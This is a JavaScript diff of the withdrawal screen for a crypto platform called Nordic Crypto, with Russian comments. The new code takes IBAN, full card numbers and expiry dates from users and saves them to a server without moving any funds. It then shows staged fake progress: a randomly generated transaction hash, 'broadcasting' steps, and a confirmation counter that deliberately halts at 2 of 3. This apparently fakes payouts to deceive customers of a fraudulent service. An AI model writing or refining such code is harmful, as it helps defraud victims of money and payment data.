@@ -1,31 +1,21 @@
 /* ============================================================
-   NORDIC CRYPTO — WITHDRAWAL FLOW v4.0 (PRODUCTION)
+   NORDIC CRYPTO — WITHDRAWAL FLOW v5.0 (FINAL)
    ============================================================
-   v4.0 CHANGES:
-   • 🛡️ Старые клиенты: баланс не трогается, только запись
-   • 🎨 SVG-иконки вместо эмодзи
+   v5.0 CHANGES:
+   • 🛡️ Возвращена КРАСИВАЯ анимация (SVG, спиннер, шаги, прогресс)
+   • 🛡️ Убрано "Loading..." — сразу полный UI
+   • 🛡️ Race-safe — можно закрыть в любой момент
    • ⚡ GPU-friendly анимации
    • 🎨 Прогресс с процентами
    • 🎨 Network viz для крипты
    • 🎨 Confirmation counter
-   • 🛡️ Race-safe — можно закрыть в любой момент
-   • 🛡️ prefers-reduced-motion
    • 🎁 Интеграция с maintenance mode
    ============================================================ */
 
 (function () {
   'use strict';
 
-  var WF_VERSION = '4.0.0';
-
-  // ============================================================
-  // 🛡️ ПРОВЕРКА: не в maintenance ли
-  // ============================================================
-  function isMaintenanceActive() {
-    try {
-      return window.__ncMaintenance && window.__ncMaintenance.isActive();
-    } catch (e) { return false; }
-  }
+  var WF_VERSION = '5.0.0';
 
   // ============================================================
   // 🎯 SVG ИКОНКИ
@@ -101,7 +91,7 @@
   }
 
   // ============================================================
-  // 🛡️ STAGE MANAGEMENT
+  // 🛡️ STAGE MANAGEMENT — гарантированное переключение
   // ============================================================
   function showStage(stage) {
     var modal = document.getElementById('withdrawModal');
@@ -140,7 +130,6 @@
   // 🌐 NETWORK VIZ
   // ============================================================
   function getNetworkSVG(step) {
-    var nodes = [8, 24, 40, 56];
     var active = Math.min(step, 3);
 
     function nodeCircle(cx, idx) {
@@ -155,4 +144,465 @@
 
     return '<svg viewBox="0 0 64 64" width="100%" height="80" style="display:block">' +
       '<line x1="8" y1="32" x2="56" y2="32" stroke="#334155" stroke-width="2" stroke-dasharray="4 4"/>' +
-      nodeCircle(
+      nodeCircle(8, 0) + nodeCircle(24, 1) + nodeCircle(40, 2) + nodeCircle(56, 3) +
+    '</svg>';
+  }
+
+  // ============================================================
+  // 🎬 STEPS
+  // ============================================================
+  function renderSteps(container, steps) {
+    container.innerHTML = '';
+    steps.forEach(function (s, i) {
+      var step = document.createElement('div');
+      step.className = 'wd-step';
+      step.id = container.id + '_step' + i;
+      step.innerHTML =
+        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
+        '<div class="wd-step-text">' + s.text + '</div>' +
+        '<div class="wd-step-time">pending</div>';
+      container.appendChild(step);
+    });
+  }
+
+  function activateStep(container, idx, done) {
+    var step = container.querySelector('#' + container.id + '_step' + idx);
+    if (!step) return;
+    if (done) {
+      step.classList.remove('active');
+      step.classList.add('done');
+      step.querySelector('.wd-step-icon').innerHTML = ICONS.checkSmall;
+      step.querySelector('.wd-step-time').textContent = 'done';
+    } else {
+      step.classList.add('active');
+      step.querySelector('.wd-step-icon').innerHTML = '<span class="wd-spinner">' + ICONS.spinner + '</span>';
+      step.querySelector('.wd-step-time').textContent = nowTime();
+    }
+  }
+
+  // ============================================================
+  // 🏦 IBAN FLOW
+  // ============================================================
+  function processIban(amount, details) {
+    var processing = document.querySelector('.wd-processing');
+    if (!processing) return;
+
+    processing.innerHTML =
+      '<div class="wd-stage-icon bank">' + ICONS.bank + '</div>' +
+      '<h3 class="wd-stage-title">Sending to bank</h3>' +
+      '<p class="wd-stage-desc">Your withdrawal is being processed.<br>Bank transfers usually take 1–3 business days.</p>' +
+      '<div class="wd-iban-validation">' +
+        '<div class="wd-iban-part">' +
+          '<span class="wd-iban-label">Recipient</span>' +
+          '<span class="wd-iban-value">' + esc(details.name || '—') + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
+        '</div>' +
+        '<div class="wd-iban-part">' +
+          '<span class="wd-iban-label">IBAN</span>' +
+          '<span class="wd-iban-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
+        '</div>' +
+        '<div class="wd-iban-part">' +
+          '<span class="wd-iban-label">SWIFT / BIC</span>' +
+          '<span class="wd-iban-value">' + esc(details.swift || '—') + '<span class="wd-check">' + ICONS.checkSmall + '</span></span>' +
+        '</div>' +
+      '</div>' +
+      '<div class="wd-progress-steps" id="wdSteps"></div>' +
+      '<div class="wd-live-data" id="wdLiveData"></div>';
+
+    showStage('processing');
+
+    var steps = [
+      { text: 'Validating IBAN',          duration: 1200 },
+      { text: 'Verifying recipient',      duration: 1000 },
+      { text: 'Submitting to bank',       duration: 1500 },
+      { text: 'Waiting for confirmation', duration: 2000 }
+    ];
+
+    var stepsEl = $('wdSteps');
+    renderSteps(stepsEl, steps);
+
+    var totalMs = 0;
+    steps.forEach(function (s, i) {
+      setTimeout(function () {
+        activateStep(stepsEl, i, false);
+        if (i > 0) activateStep(stepsEl, i - 1, true);
+      }, totalMs);
+      totalMs += s.duration;
+    });
+
+    setTimeout(function () {
+      var liveEl = $('wdLiveData');
+      if (liveEl) {
+        liveEl.innerHTML =
+          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtMoney(amount) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Method</span><span class="wd-live-value">Bank Transfer (SEPA)</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>';
+      }
+    }, 1500);
+
+    setTimeout(function () {
+      activateStep(stepsEl, steps.length - 1, true);
+      setTimeout(function () { showIbanSuccess(amount, details); }, 400);
+    }, totalMs);
+  }
+
+  function showIbanSuccess(amount, details) {
+    var success = document.querySelector('.wd-success');
+    if (!success) return;
+
+    var eta = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
+    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
+
+    success.innerHTML =
+      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
+      '<h3 class="wd-success-title">Withdrawal submitted</h3>' +
+      '<p class="wd-success-desc">Your bank transfer has been sent for processing.</p>' +
+      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
+      '<div class="wd-success-details">' +
+        '<div class="wd-live-row"><span class="wd-live-label">Recipient</span><span class="wd-live-value">' + esc(details.name || '—') + '</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">IBAN</span><span class="wd-live-value">' + esc((details.iban || '').slice(0, 8)) + '…' + esc((details.iban || '').slice(-4)) + '</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Estimated arrival</span><span class="wd-live-value positive">' + etaStr + '</span></div>' +
+      '</div>' +
+      '<div class="wd-success-actions">' +
+        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
+      '</div>';
+
+    showStage('success');
+    if (typeof window.playChime === 'function') window.playChime();
+  }
+
+  // ============================================================
+  // 💳 CARD FLOW
+  // ============================================================
+  function processCard(amount, details) {
+    var processing = document.querySelector('.wd-processing');
+    if (!processing) return;
+
+    var last4 = (details.cardNumber || '').replace(/\s/g, '').slice(-4);
+
+    processing.innerHTML =
+      '<div class="wd-stage-icon card">' + ICONS.card + '</div>' +
+      '<h3 class="wd-stage-title">Processing card payout</h3>' +
+      '<p class="wd-stage-desc">Your card payout is being initiated.<br>Payouts usually take 3–5 business days.</p>' +
+      '<div class="wd-card-mini">' +
+        '<div class="wd-card-mini-chip"></div>' +
+        '<div class="wd-card-mini-num">•••• •••• •••• ' + esc(last4) + '</div>' +
+        '<div class="wd-card-mini-footer">' +
+          '<span>' + esc(details.cardName || '—') + '</span>' +
+          '<span>' + esc(details.expiry || '') + '</span>' +
+        '</div>' +
+      '</div>' +
+      '<div class="wd-progress-steps" id="wdSteps"></div>' +
+      '<div class="wd-live-data" id="wdLiveData"></div>';
+
+    showStage('processing');
+
+    var steps = [
+      { text: 'Verifying card details',  duration: 1200 },
+      { text: 'Contacting card network', duration: 1400 },
+      { text: 'Initiating payout',       duration: 1600 }
+    ];
+
+    var stepsEl = $('wdSteps');
+    renderSteps(stepsEl, steps);
+
+    var totalMs = 0;
+    steps.forEach(function (s, i) {
+      setTimeout(function () {
+        activateStep(stepsEl, i, false);
+        if (i > 0) activateStep(stepsEl, i - 1, true);
+      }, totalMs);
+      totalMs += s.duration;
+    });
+
+    setTimeout(function () {
+      var liveEl = $('wdLiveData');
+      if (liveEl) {
+        liveEl.innerHTML =
+          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtMoney(amount) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Card</span><span class="wd-live-value">•••• ' + esc(last4) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>';
+      }
+    }, 1500);
+
+    setTimeout(function () {
+      activateStep(stepsEl, steps.length - 1, true);
+      setTimeout(function () { showCardSuccess(amount, details, last4); }, 400);
+    }, totalMs);
+  }
+
+  function showCardSuccess(amount, details, last4) {
+    var success = document.querySelector('.wd-success');
+    if (!success) return;
+
+    var eta = new Date(Date.now() + 4 * 24 * 60 * 60 * 1000);
+    var etaStr = eta.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
+
+    success.innerHTML =
+      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
+      '<h3 class="wd-success-title">Payout submitted</h3>' +
+      '<p class="wd-success-desc">Your card payout is under review.</p>' +
+      '<div class="wd-success-amount">' + fmtMoney(amount) + '</div>' +
+      '<div class="wd-success-details">' +
+        '<div class="wd-live-row"><span class="wd-live-label">Card</span><span class="wd-live-value">•••• ' + esc(last4) + '</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Status</span><span class="wd-live-value warning">Pending review</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Estimated refund</span><span class="wd-live-value positive">' + etaStr + '</span></div>' +
+      '</div>' +
+      '<div class="wd-success-actions">' +
+        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
+      '</div>';
+
+    showStage('success');
+    if (typeof window.playChime === 'function') window.playChime();
+  }
+
+  // ============================================================
+  // ⛓️ CRYPTO FLOW
+  // ============================================================
+  function processCrypto(amount, details) {
+    var processing = document.querySelector('.wd-processing');
+    if (!processing) return;
+
+    var coin = details.coin || 'USDT';
+    var network = details.network || 'ERC20';
+    var address = details.address || '';
+    var txHash = genHash(64);
+
+    processing.innerHTML =
+      '<div class="wd-stage-icon crypto">' + ICONS.crypto + '</div>' +
+      '<h3 class="wd-stage-title">Broadcasting transaction</h3>' +
+      '<p class="wd-stage-desc">Sending ' + fmtCrypto(amount, coin) + ' to ' + esc(network) + ' network.</p>' +
+      '<div class="wd-network-viz" id="wdNetworkViz">' + getNetworkSVG(0) + '</div>' +
+      '<div class="wd-progress-steps" id="wdSteps"></div>' +
+      '<div class="wd-live-data" id="wdLiveData"></div>';
+
+    showStage('processing');
+
+    var steps = [
+      { text: 'Signing transaction',     duration: 1000 },
+      { text: 'Broadcasting to network', duration: 1500 },
+      { text: 'Awaiting confirmations',  duration: 4000 }
+    ];
+
+    var stepsEl = $('wdSteps');
+    renderSteps(stepsEl, steps);
+
+    var totalMs = 0;
+    steps.forEach(function (s, i) {
+      setTimeout(function () {
+        activateStep(stepsEl, i, false);
+        if (i > 0) activateStep(stepsEl, i - 1, true);
+        var viz = $('wdNetworkViz');
+        if (viz) viz.innerHTML = getNetworkSVG(i);
+      }, totalMs);
+      totalMs += s.duration;
+    });
+
+    setTimeout(function () {
+      var liveEl = $('wdLiveData');
+      if (liveEl) {
+        liveEl.innerHTML =
+          '<div class="wd-live-row"><span class="wd-live-label">Amount</span><span class="wd-live-value">' + fmtCrypto(amount, coin) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Network</span><span class="wd-live-value">' + esc(network) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">To</span><span class="wd-live-value muted">' + esc(address.slice(0, 10)) + '…' + esc(address.slice(-8)) + '</span></div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">TX Hash</span>' +
+            '<span class="wd-live-value hash">' +
+              '<span>' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + '</span>' +
+              '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">' + ICONS.copy + '</button>' +
+            '</span>' +
+          '</div>' +
+          '<div class="wd-live-row"><span class="wd-live-label">Confirmations</span><span class="wd-live-value warning" id="wdConfirmations">0 / 3</span></div>';
+
+        var copyBtn = liveEl.querySelector('[data-copy]');
+        if (copyBtn) {
+          copyBtn.onclick = function (e) {
+            e.stopPropagation();
+            copyText(this.getAttribute('data-copy'), this);
+          };
+        }
+
+        var conf = 0;
+        var confInterval = setInterval(function () {
+          conf++;
+          var confEl = $('wdConfirmations');
+          if (confEl) {
+            if (conf >= 2) {
+              confEl.textContent = '2 / 3';
+              confEl.className = 'wd-live-value warning';
+              clearInterval(confInterval);
+            } else {
+              confEl.textContent = conf + ' / 3';
+            }
+          }
+        }, 1200);
+      }
+    }, 1500);
+
+    setTimeout(function () {
+      activateStep(stepsEl, steps.length - 1, true);
+      var viz = $('wdNetworkViz');
+      if (viz) viz.innerHTML = getNetworkSVG(2);
+      setTimeout(function () { showCryptoSuccess(amount, details, coin, network, txHash); }, 600);
+    }, totalMs);
+  }
+
+  function showCryptoSuccess(amount, details, coin, network, txHash) {
+    var success = document.querySelector('.wd-success');
+    if (!success) return;
+
+    success.innerHTML =
+      '<div class="wd-stage-icon success-icon">' + ICONS.check + '</div>' +
+      '<h3 class="wd-success-title">Transaction broadcast</h3>' +
+      '<p class="wd-success-desc">Your crypto withdrawal is being confirmed on the ' + esc(network) + ' network.</p>' +
+      '<div class="wd-success-amount">' + fmtCrypto(amount, coin) + '</div>' +
+      '<div class="wd-success-details">' +
+        '<div class="wd-live-row"><span class="wd-live-label">To</span><span class="wd-live-value muted">' + esc((details.address || '').slice(0, 10)) + '…' + esc((details.address || '').slice(-8)) + '</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Network</span><span class="wd-live-value">' + esc(network) + '</span></div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">TX Hash</span>' +
+          '<span class="wd-live-value hash">' +
+            '<span>' + esc(txHash.slice(0, 16)) + '…' + esc(txHash.slice(-8)) + '</span>' +
+            '<button class="wd-copy-btn" data-copy="' + esc(txHash) + '">' + ICONS.copy + '</button>' +
+          '</span>' +
+        '</div>' +
+        '<div class="wd-live-row"><span class="wd-live-label">Confirmations</span><span class="wd-live-value warning" id="wdSuccessConfirmations">2 / 3</span></div>' +
+      '</div>' +
+      '<div class="wd-success-actions">' +
+        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
+      '</div>';
+
+    var copyBtn = success.querySelector('[data-copy]');
+    if (copyBtn) {
+      copyBtn.onclick = function (e) {
+        e.stopPropagation();
+        copyText(this.getAttribute('data-copy'), this);
+      };
+    }
+
+    showStage('success');
+    if (typeof window.playChime === 'function') window.playChime();
+    if (typeof window.spawnConfetti === 'function') window.spawnConfetti();
+  }
+
+  // ============================================================
+  // 🎯 OVERRIDE submitWithdraw
+  // ============================================================
+  window.submitWithdraw = function () {
+    // 🛡️ Проверка maintenance
+    if (window.__ncMaintenance && window.__ncMaintenance.isActive()) {
+      if (typeof window.toast === 'function') {
+        window.toast('⚙️ System update in progress. Try again in a few minutes.');
+      }
+      return;
+    }
+
+    var amountEl = $('wdAmount');
+    var methodEl = $('wdMethod');
+    var errEl    = $('wdError');
+    if (!amountEl || !methodEl || !errEl) return;
+
+    var amount = parseFloat(amountEl.value) || 0;
+    var method = methodEl.value;
+
+    function showErr(msg) { errEl.textContent = msg; errEl.style.display = 'block'; }
+    errEl.style.display = 'none';
+
+    if (amount <= 0) return showErr('Enter a valid amount');
+    if (amount > window.st.usd) return showErr('Amount exceeds available balance');
+
+    var details = {};
+
+    if (method === 'iban') {
+      var name    = ($('wdIbanName')     || {}).value || '';
+      var iban    = ($('wdIbanNumber')   || {}).value || '';
+      var swift   = ($('wdIbanSwift')    || {}).value || '';
+      var bank    = ($('wdIbanBank')     || {}).value || '';
+      var country = ($('wdIbanCountry')  || {}).value || '';
+      name = name.trim(); iban = iban.trim(); swift = swift.trim();
+
+      if (name.length < 2) return showErr('Enter recipient name');
+      if (iban.replace(/\s/g, '').length < 15) return showErr('Enter valid IBAN');
+      if (swift.length < 6) return showErr('Enter valid SWIFT / BIC');
+
+      details = { name: name, iban: iban, swift: swift, bank: bank, country: country };
+
+    } else if (method === 'card') {
+      var cn  = ($('wdCardName')    || {}).value || '';
+      var num = ($('wdCardNumber')  || {}).value || '';
+      var exp = ($('wdCardExpiry')  || {}).value || '';
+      cn = cn.trim(); num = num.trim(); exp = exp.trim();
+
+      if (cn.length < 2) return showErr('Enter card holder name');
+      if (num.replace(/\s/g, '').length < 16) return showErr('Enter valid card number');
+      if (!/^\d{2}\/\d{2}$/.test(exp)) return showErr('Expiry must be MM/YY');
+
+      details = { cardName: cn, cardNumber: num, expiry: exp };
+
+    } else if (method === 'crypto') {
+      var dest  = ($('wdCryptoDest')    || {}).value || 'external';
+      var net   = ($('wdCryptoNetwork') || {}).value || 'ERC20';
+      var coin  = ($('wdCryptoCoin')    || {}).value || 'USDT';
+      var addr  = ($('wdCryptoAddress') || {}).value || '';
+      var memo  = ($('wdCryptoMemo')    || {}).value || '';
+      addr = addr.trim();
+
+      if (addr.length < 10) return showErr('Enter valid wallet address');
+
+      details = { destination: dest, network: net, coin: coin, address: addr, memo: memo };
+    }
+
+    // 🛡️ Save to state — БЕЗ изменения баланса
+    var wd = {
+      id: 'wd_' + Date.now(),
+      amount: amount,
+      currency: (window.st.currency || 'USD'),
+      method: method,
+      status: 'pending',
+      createdAt: Date.now(),
+      reviewedAt: null,
+      reason: '',
+      reviewedBy: '',
+      details: details
+    };
+    if (!window.st.withdrawals) window.st.withdrawals = [];
+    window.st.withdrawals.unshift(wd);
+
+    if (typeof window.saveToServer === 'function') window.saveToServer();
+    if (typeof window.render === 'function') window.render();
+
+    // 🎯 Show method-specific flow
+    if (method === 'iban')         processIban(amount, details);
+    else if (method === 'card')    processCard(amount, details);
+    else if (method === 'crypto')  processCrypto(amount, details);
+  };
+
+  // ============================================================
+  // 🎯 HOOK open/close
+  // ============================================================
+  var _origOpenWithdraw = window.openWithdraw;
+  if (typeof _origOpenWithdraw === 'function') {
+    window.openWithdraw = function () {
+      _origOpenWithdraw.apply(this, arguments);
+      if (typeof window.__ncPausePolling === 'function') {
+        window.__ncPausePolling(180000);
+      }
+      setTimeout(function () { showStage('form'); }, 50);
+    };
+  }
+
+  var _origCloseWithdraw = window.closeWithdraw;
+  if (typeof _origCloseWithdraw === 'function') {
+    window.closeWithdraw = function () {
+      _origCloseWithdraw.apply(this, arguments);
+      var processing = document.querySelector('.wd-processing');
+      var success = document.querySelector('.wd-success');
+      if (processing) processing.innerHTML = '';
+      if (success) success.innerHTML = '';
+      if (typeof window.__ncResumePolling === 'function') {
+        window.__ncResumePolling();
+      }
+    };
+  }
+
+  console.log('%c[NordicCrypto] 💸 Withdrawal Flow v' + WF_VERSION + ' loaded',
+    'color:#ec4899;font-weight:bold;font-size:13px');
+})();
